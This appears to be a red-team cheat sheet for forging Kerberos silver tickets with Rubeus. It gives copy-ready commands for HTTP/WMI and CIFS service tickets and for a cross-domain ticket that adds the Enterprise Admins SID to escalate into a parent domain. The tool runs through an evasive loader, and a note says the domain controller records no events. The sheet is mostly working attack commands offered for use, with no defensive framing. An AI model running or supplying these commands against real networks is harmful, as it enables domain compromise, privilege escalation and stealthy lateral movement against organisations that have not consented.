# Silver Ticket (Rubeus)

Forge a service ticket (TGS) without contacting the KDC. Works when you have the target machine's hash.

## Prerequisites
- Service account or machine account hash (RC4/AES256)
- Domain SID
- Target SPN

## Forge for HTTP/WMI
```
Loader.exe -path Rubeus.exe -args evasive-silver /service:http/<TARGET> /rc4:<machine_hash> /sid:<domain_sid> /ldap /user:Administrator /ptt
```

## Forge for CIFS
```
Loader.exe -path Rubeus.exe -args evasive-silver /service:cifs/<TARGET> /rc4:<machine_hash> /sid:<domain_sid> /ldap /user:Administrator /ptt
```

## Forge for Inter-Realm (cross-domain TGT referral)
```
Loader.exe -path Rubeus.exe -args evasive-silver /service:krbtgt/<CHILD_DOMAIN> /rc4:<trust_key_rc4> /sid:<child_domain_sid> /sids:<EA_SID>-519 /ldap /user:Administrator /nowrap
```
Then use the output ticket with `asktgs` to get a TGS in the parent domain.

## Notes
- No OPSEC events on DC (KDC not contacted)
- `/ldap` pulls PAC group data
- `/nowrap` outputs single-line base64 for piping into asktgs
